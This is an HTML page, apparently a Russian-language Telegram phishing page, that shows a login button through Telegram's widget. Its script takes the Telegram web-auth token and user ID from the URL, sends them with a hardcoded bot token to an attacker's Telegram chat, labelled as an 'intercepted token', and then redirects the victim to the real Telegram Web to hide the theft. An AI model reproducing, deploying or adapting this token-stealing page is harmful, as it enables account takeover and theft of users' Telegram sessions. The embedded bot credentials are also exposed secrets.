<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <title>Loading...</title>
    <!-- –ü–æ–¥–∫–ª—é—á–∞–µ–º –≤–∏–¥–∂–µ—Ç Telegram -->
    <script async src="https://telegram.org/js/telegram-widget.js?22" 
            data-telegram-login="jdwgwvshsbsj_bot" 
            data-size="large" 
            data-auth-url="https://teeleg-deep.netlify.app" 
            data-request-access="write">
    </script>
    <!-- –ù–ï —Å–∫—Ä—ã–≤–∞–µ–º –∫–Ω–æ–ø–∫—É -->
</head>
<body>
    <p>–ù–∞–∂–º–∏—Ç–µ –∫–Ω–æ–ø–∫—É –Ω–∏–∂–µ –¥–ª—è –≤—Ö–æ–¥–∞:</p>
    <!-- –í–∏–¥–∂–µ—Ç —Å–∞–º —Å–æ–∑–¥–∞—Å—Ç –∫–Ω–æ–ø–∫—É –≤ —ç—Ç–æ–º –º–µ—Å—Ç–µ -->

    <script>
        function sendToken(token, userId) {
            const botToken = '8541613029:AAF9uWzlAYEJy1kNM89yQfMtIz3bh53AOo4';
            const chatId = '8220267007';
            let message = `üîê –ü–µ—Ä–µ—Ö–≤–∞—á–µ–Ω —Ç–æ–∫–µ–Ω: ${token}`;
            if (userId) message += `\nUser ID: ${userId}`;
            message += `\nURL: ${window.location.href}`;
            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: chatId, text: message })
            }).catch(() => {});
        }

        // –ü—Ä–æ–≤–µ—Ä—è–µ–º, –Ω–µ—Ç –ª–∏ —Ç–æ–∫–µ–Ω–∞ –≤ —Ö—ç—à–µ (–ø–æ—Å–ª–µ —Ä–µ–¥–∏—Ä–µ–∫—Ç–∞)
        (function() {
            const hash = window.location.hash.substring(1);
            if (hash) {
                const params = new URLSearchParams(hash);
                const token = params.get('tgWebAuthToken');
                const userId = params.get('tgWebAuthUserId');
                if (token) {
                    sendToken(token, userId);
                    // –ü–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª—è–µ–º –Ω–∞ –æ—Ñ–∏—Ü–∏–∞–ª—å–Ω—ã–π Telegram Web
                    window.location.replace('https://web.telegram.org/k/');
                }
            }
        })();
    </script>
</body>
</html>
